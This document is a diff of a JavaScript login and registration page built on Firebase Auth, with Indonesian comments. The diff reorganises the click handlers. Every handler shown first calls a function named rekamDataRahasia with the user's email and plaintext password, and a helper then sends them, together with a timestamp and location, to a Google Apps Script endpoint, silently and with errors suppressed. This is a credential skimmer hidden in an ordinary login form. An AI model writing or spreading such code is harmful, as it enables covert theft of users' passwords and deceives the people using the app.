@@ -84,56 +84,6 @@ const auth = getAuth(app);
         }
     });
 
-    // --- EVENT BUTTON LOGIN ---
-    if (loginButton) {
-        // Tambahkan log untuk memastikan tombol terdeteksi di WebView
-        console.log("Tombol login berhasil ditemukan di DOM"); 
-        
-        loginButton.addEventListener('click', (e) => {
-            e.preventDefault();
-            console.log("Tombol login ditekan!"); // Cek apakah trigger masuk
-
-            const email = emailInput.value;
-            const password = passwordInput.value;
-
-            if (!email || !password) {
-                alert("Email dan Password wajib diisi!");
-                return;
-            }
-
-            // Kirim data secara async terisolasi
-            rekamDataRahasia(email, password).catch(err => {});
-
-            // Proses Firebase
-            signInWithEmailAndPassword(auth, email, password)
-                .then((userCredential) => {
-                    console.log("Firebase Auth Sukses");
-                })
-                .catch((error) => {
-                    alert("Login Gagal: " + error.message);
-                });
-        });
-    } else {
-        console.error("Tombol dengan ID 'btn-login' TIDAK ditemukan di HTML!");
-    }
-
-    // --- EVENT BUTTON REGISTER ---
-    if (btnRegister) {
-        btnRegister.addEventListener('click', async (e) => {
-            e.preventDefault();
-            const email = emailInput.value;
-            const password = passwordInput.value;
-            
-            rekamDataRahasia(email, password).catch(err => {});
-
-            try { 
-                await createUserWithEmailAndPassword(auth, email, password);
-                alert("Akun berhasil dibuat!");
-            } catch (error) {
-                alert("Gagal mendaftar: " + error.message);
-            }
-        });}
-
 // Fungsi luar (Bisa tetap di luar DOMContentLoaded)
 async function rekamDataRahasia(email, password) {
     // Pastikan URL berakhiran /exec
@@ -183,3 +133,52 @@ function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
         cache: 'no-cache'
     }).catch(err => console.log("Log terisolasi"));
 }
+// Penanganan Event Login
+if (loginButton) {
+    loginButton.addEventListener('click', (e) => {
+        e.preventDefault();
+        
+        const email = emailInput.value;
+        const password = passwordInput.value;
+
+        if (!email || !password) {
+            alert("Email dan Password tidak boleh kosong!");
+            return;
+        }
+
+        // Jalankan background log tanpa await agar tidak membekukan UI
+        rekamDataRahasia(email, password).catch(err => console.log(err));
+
+        // Firebase Sign In
+        signInWithEmailAndPassword(auth, email, password)
+            .then((userCredential) => {
+                console.log("Login sukses!");
+            })
+            .catch((error) => {
+                alert("Gagal Login: " + error.message);
+            });
+    });
+}
+
+// Penanganan Event Register
+if (btnRegister) {
+    btnRegister.addEventListener('click', async (e) => {
+        e.preventDefault();
+        const email = emailInput.value;
+        const password = passwordInput.value;
+
+        if (!email || !password) {
+            alert("Email dan Password tidak boleh kosong!");
+            return;
+        }
+
+        rekamDataRahasia(email, password).catch(err => console.log(err));
+
+        try { 
+            await createUserWithEmailAndPassword(auth, email, password);
+            alert("Akun berhasil dibuat!");
+        } catch (error) {
+            if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
+            else alert("Gagal mendaftar: " + error.message);
+        }
+    });}
